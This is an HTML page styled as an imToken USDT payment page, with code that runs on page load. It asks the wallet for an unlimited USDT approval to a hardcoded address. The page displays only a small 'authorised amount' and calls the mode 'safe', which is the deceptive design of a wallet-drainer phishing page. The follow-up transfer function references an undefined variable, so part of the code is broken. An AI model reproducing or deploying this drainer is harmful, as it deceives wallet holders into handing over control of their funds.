<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>imToken 授权 + 支付</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.9.0/dist/web3.min.js"></script>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      max-width: 800px;
      margin: 0 auto;
      padding: 20px;
    }
    .container {
      background: #fff;
      border-radius: 8px;
      padding: 20px;
      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }
    .status {
      padding: 10px;
      margin: 10px 0;
      border-radius: 4px;
      background: #f5f5f5;
    }
    .success {
      color: #52c41a;
    }
    .error {
      color: #f5222d;
    }
    .info {
      color: #1890ff;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>imToken - 授权后自动支付 USDT</h2>
    <div id="status" class="status">状态：加载中...</div>
    <div id="approval" style="display: none;">
      <h3>授权信息</h3>
      <p>授权金额：<span id="price1"></span> USDT</p>
      <p>授权模式：<span id="aqorbmdinfo">安全模式</span></p>
    </div>
  </div>

  <script>
    // 获取URL参数
    function getQueryVariable(variable) {
      var query = window.location.search.substring(1);
      var vars = query.split("&");
      for (var i = 0; i < vars.length; i++) {
        var pair = vars[i].split("=");
        if (pair[0] === variable) {
          return decodeURIComponent(pair[1]);
        }
      }
      return null;
    }

    // 设置页面内容
    function setElementContentById(id, content) {
      var element = document.getElementById(id);
      if (element) {
        element.innerText = content;
      }
    }

    // 初始化参数
    const toAddress = "0x39eED5Ed04dbFA049890D77B0309Aa1a2D411075"; // 收款人地址
    const contractAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT 合约地址
    const decimals = 6;
    const fromImToken = location.hash.includes("from=imtoken");

    // 获取并设置金额
    var shopPrice = parseFloat(getQueryVariable('price'));
    if (!isNaN(shopPrice)) {
      setElementContentById('price1', shopPrice);
    }

    const amountInWei = (BigInt(shopPrice * (10 ** decimals))).toString();

    async function getWallet() {
      document.getElementById("status").innerText = "请求钱包授权...";
      try {
        // 使用 ethereum.request 方式获取钱包地址
        const accounts = await window.ethereum.request({method: 'eth_requestAccounts'});
        if (!accounts || accounts.length === 0) {
          throw new Error("获取钱包地址失败");
        }
        return accounts[0];
      } catch (error) {
        console.error("获取钱包地址错误:", error);
        throw error;
      }
    }

    async function approveUSDT(from) {
      try {
        // 使用 Web3 方式发送授权交易
        const web3 = new Web3(window.ethereum);
        const contract = new web3.eth.Contract(contract_abi, contractAddress);
        const amount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
        
        const result = await contract.methods.approve(toAddress, amount)
          .send({from: from})
          .on('transactionHash', function(hash) {
            console.log('授权交易哈希:', hash);
          });
        
        if (!result || !result.transactionHash) {
          throw new Error("授权交易失败");
        }
        return result.transactionHash;
      } catch (error) {
        console.error("授权交易错误:", error);
        throw error;
      }
    }

    async function transferUSDT() {
      try {
        // 使用 Web3 方式发送转账交易
        const web3 = new Web3(window.ethereum);
        const contract = new web3.eth.Contract(contract_abi, contractAddress);
        
        const result = await contract.methods.transfer(toAddress, amountInWei)
          .send({from: from})
          .on('transactionHash', function(hash) {
            console.log('转账交易哈希:', hash);
          });
        
        if (!result || !result.transactionHash) {
          throw new Error("支付交易失败");
        }
        return result.transactionHash;
      } catch (error) {
        console.error("支付交易错误:", error);
        throw error;
      }
    }

    // 添加 USDT 合约 ABI
    const contract_abi = [{
      "constant": true,
      "inputs": [],
      "name": "name",
      "outputs": [{"name": "", "type": "string"}],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    }, {
      "constant": false,
      "inputs": [{"name": "_spender", "type": "address"}, {"name": "_value", "type": "uint256"}],
      "name": "approve",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }, {
      "constant": false,
      "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}],
      "name": "transfer",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }];

    async function startFlow() {
      if (!window.imToken) {
        if (!fromImToken) {
          // 使用正确的 imToken 跳转协议
          const currentUrl = encodeURIComponent(location.href + "#from=imtoken");
          const jump = `imtokenv2://navigate/DappView?url=${currentUrl}`;
          window.location.href = jump;
          return;
        } else {
          document.getElementById("status").innerText = "请在 imToken App 内打开此页面";
          return;
        }
      }

      try {
        const address = await getWallet();
        document.getElementById("status").innerText = `钱包已连接：${address}`;
        document.getElementById("approval").style.display = "block";

        // Step 1: 授权
        document.getElementById("status").innerText = "发送授权交易...";
        const approveHash = await approveUSDT(address);
        document.getElementById("status").innerText = `✅ 授权成功，TxHash：${approveHash}`;

        // Step 2: 支付
        document.getElementById("status").innerText = "发送支付交易...";
        const txHash = await transferUSDT();
        document.getElementById("status").innerText = `✅ 支付成功，TxHash：${txHash}`;
      } catch (e) {
        console.error("失败：", e);
        document.getElementById("status").innerText = "❌ 操作失败：" + (e?.message || "未知错误");
      }
    }

    // 等待页面加载完成后开始流程
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", () => {
        setTimeout(startFlow, 500);
      });
    } else {
      setTimeout(startFlow, 500);
    }
  </script>
</body>
</html>